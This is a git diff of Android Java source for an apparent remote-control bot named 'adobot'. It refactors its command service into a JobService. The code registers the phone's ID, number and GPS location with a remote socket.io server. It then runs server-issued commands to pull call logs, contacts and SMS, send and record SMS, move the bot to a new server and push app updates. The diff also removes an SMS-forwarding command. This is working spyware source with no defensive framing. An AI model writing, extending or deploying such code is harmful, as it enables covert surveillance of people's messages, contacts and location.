@@ -1,10 +1,28 @@
-package com.android.adobot;
+package com.android.adobot.network;
 
-import android.app.Service;
+import android.app.job.JobParameters;
+import android.app.job.JobService;
+import android.content.Context;
 import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.os.Build;
 import android.os.Environment;
-import android.os.IBinder;
+import android.support.annotation.RequiresApi;
 import android.util.Log;
+
+import com.android.adobot.AdobotConstants;
+import com.android.adobot.CommonParams;
+import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
+import com.android.adobot.tasks.GetCallLogsTask;
+import com.android.adobot.tasks.GetContactsTask;
+import com.android.adobot.tasks.GetSmsTask;
+import com.android.adobot.tasks.LocationMonitor;
+import com.android.adobot.tasks.SendSmsTask;
+import com.android.adobot.tasks.SmsRecorderTask;
+import com.android.adobot.tasks.TransferBotTask;
+import com.android.adobot.tasks.UpdateAppTask;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -14,68 +32,77 @@ import java.io.File;
 import java.net.URISyntaxException;
 import java.util.HashMap;
 
-import com.android.adobot.http.Http;
-import com.android.adobot.http.HttpRequest;
-
 import io.socket.client.Ack;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
-import com.android.adobot.tasks.GetCallLogsTask;
-import com.android.adobot.tasks.GetContactsTask;
-import com.android.adobot.tasks.GetSmsTask;
-import com.android.adobot.tasks.LocationMonitor;
-import com.android.adobot.tasks.SendSmsTask;
-import com.android.adobot.tasks.SmsForwarder;
-import com.android.adobot.tasks.TransferBotTask;
-import com.android.adobot.tasks.UpdateAppTask;
+@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+public class NetworkSchedulerService extends JobService {
 
+    private static final String TAG = NetworkSchedulerService.class.getSimpleName();
 
-public class CommandService extends Service {
+    private SmsRecorderTask smsRecorderTask;
 
-    private static final String TAG = "CommandService";
+    public static Socket socket;
+    public static boolean connected = false;
+    private static int MAX_RECONNECT = 10;
 
+    private int reconnects = 0;
     private LocationMonitor locationTask;
-    private SmsForwarder smsForwarder;
     private CommonParams params;
-    private CommandService client;
-    private Socket socket;
-    private boolean connected = false;
-    private boolean registered;
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    private NetworkSchedulerService client;
+    private JobParameters jobParameters;
 
     @Override
     public void onCreate() {
-
         super.onCreate();
 
-        smsForwarder = new SmsForwarder(this);
-        params = new CommonParams(this);
-        client = this;
-        connected = false;
-        locationTask = new LocationMonitor(this);
-        locationTask.start();
-        createSocket(params.getServer());
-        cleanUp();
+        init();
 
+        Log.i(TAG, "Service created");
+    }
+
+    /**
+     * When the app's NetworkConnectionActivity is created, it starts this service. This is so that the
+     * activity and this service can communicate back and forth. See "setUiCallback()"
+     */
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.i(TAG, "onStartCommand");
+        init();
+        return START_NOT_STICKY;
+    }
+
+
+    @Override
+    public boolean onStartJob(final JobParameters params) {
+        jobParameters = params;
+        Log.i(TAG, "onStartJob: ");
+        if (!connected)
+            socket.connect();
+        smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
+            @Override
+            public void onResult(boolean success) {
+                Log.i(TAG, "Done submit record!!!!");
+//                jobFinished(params, true);
+            }
+        });
+        return true;
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        super.onStartCommand(intent, flags, startId);
-        Log.i(TAG, "Running onStartCommand");
+    public boolean onStopJob(JobParameters params) {
+        Log.i(TAG, "onStopJob: ");
+        disconnect();
+        return true;
+    }
 
-        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
-        if (!connected) {
-            Log.i(TAG, "Socket is connecting ......\n");
-            socket.connect();
-        }
-        return START_STICKY;
+    @Override
+    public void onDestroy() {
+        Log.i(TAG, "Destroyed!!");
+        super.onDestroy();
+        disconnect();
     }
 
     public void changeServer(String url) {
@@ -84,6 +111,32 @@ public class CommandService extends Service {
         locationTask.setServer(url);
         createSocket(url);
         socket.connect();
+    }
+
+    public boolean hasConnection() {
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo info = cm.getActiveNetworkInfo();
+
+        return (info != null && info.isConnected());
+    }
+
+    private void init() {
+
+        if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
+        if (params == null) params = new CommonParams(this);
+        if (client == null) client = this;
+        if (locationTask == null) locationTask = new LocationMonitor(this);
+        if (socket == null) createSocket(params.getServer());
+
+        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
+
+        if (!connected) {
+            Log.i(TAG, "Socket is connecting ......\n");
+            socket.connect();
+        }
+
+        cleanUp();
+
     }
 
     private void createSocket(String url) {
@@ -97,6 +150,7 @@ public class CommandService extends Service {
 
                     Log.i(TAG, "\n\nSocket connected\n\n");
                     connected = true;
+                    reconnects = 0;
 
                     HashMap bot = new HashMap();
                     bot.put("uid", params.getUid());
@@ -107,13 +161,11 @@ public class CommandService extends Service {
                     bot.put("phone", params.getPhone());
                     bot.put("lat", locationTask.getLatitude());
                     bot.put("longi", locationTask.getLongitude());
-                    bot.put("sms_forwarder_status", smsForwarder.isListening());
 
                     JSONObject obj = new JSONObject(bot);
                     socket.emit("register", obj, new Ack() {
                         @Override
                         public void call(Object... args) {
-                            registered = true;
                             Log.i(TAG, "Socket connected");
                         }
                     });
@@ -171,18 +223,6 @@ public class CommandService extends Service {
                                 TransferBotTask t = new TransferBotTask(client, newServer);
                                 t.start();
 
-                            } else if (command.equals("smsforwarder")) {
-                                String isForward = cmd.get("arg1").toString();
-                                String pNumber = cmd.has("arg2") ? cmd.get("arg2").toString() : "";
-                                if (isForward.equals("forward")) {
-                                    Log.i(TAG, "\nInvoking Forward SMS forward command\n");
-                                    smsForwarder.setRecipientNumber(pNumber);
-                                    smsForwarder.listen();
-                                } else if (isForward.equals("stop")) {
-                                    Log.i(TAG, "\nInvoking Forward SMS stop command\n");
-                                    smsForwarder.stopForwarding();
-                                }
-
                             } else {
                                 Log.i(TAG, "Unknown command");
                                 HashMap xcmd = new HashMap();
@@ -226,7 +266,14 @@ public class CommandService extends Service {
             socket.on(Socket.EVENT_RECONNECTING, new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-                    Log.i(TAG, "Socket reconnecting...");
+                    if (hasConnection() && reconnects <= MAX_RECONNECT) {
+                        reconnects++;
+                        Log.i(TAG, "Socket reconnecting...");
+                    } else {
+                        reconnects = 0;
+                        jobFinished(jobParameters, true);
+                        disconnect();
+                    }
                 }
             });
 
@@ -236,11 +283,14 @@ public class CommandService extends Service {
 
     }
 
+    private void disconnect() {
+        if (socket != null) socket.disconnect();
+    }
+
     private void cleanUp () {
 //        remove previously installed update apk file
-        File updateApk = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), Constants.UPDATE_PKG_FILE_NAME);
+        File updateApk = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), AdobotConstants.UPDATE_PKG_FILE_NAME);
         if (updateApk.exists())
             updateApk.delete();
     }
-
 }
